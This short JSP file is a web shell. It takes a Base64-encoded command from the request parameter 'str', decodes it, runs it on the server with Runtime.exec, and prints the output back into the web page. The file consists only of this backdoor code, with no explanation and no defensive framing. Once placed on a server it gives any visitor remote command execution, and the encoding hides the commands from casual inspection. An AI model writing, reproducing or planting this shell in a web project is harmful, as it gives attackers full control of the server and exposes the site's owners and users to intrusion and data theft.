<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.io.*"/>
<jsp:directive.page import="sun.misc.BASE64Decoder"/>
<jsp:scriptlet><![CDATA[
	String tmp = pageContext.getRequest().getParameter("str");
	if (tmp != null&&!"".equals(tmp)) {
	try{
		String str = new String((new BASE64Decoder()).decodeBuffer(tmp));
		Process p = Runtime.getRuntime().exec(str);
		InputStream in = p.getInputStream();
		BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK"));
		String brs = br.readLine();
		while(brs!=null){
			out.println(brs+"</br>");
			brs = br.readLine();
		}
		}catch(Exception ex){
			out.println(ex.toString());
		}
	}]]>
</jsp:scriptlet>
</jsp:root>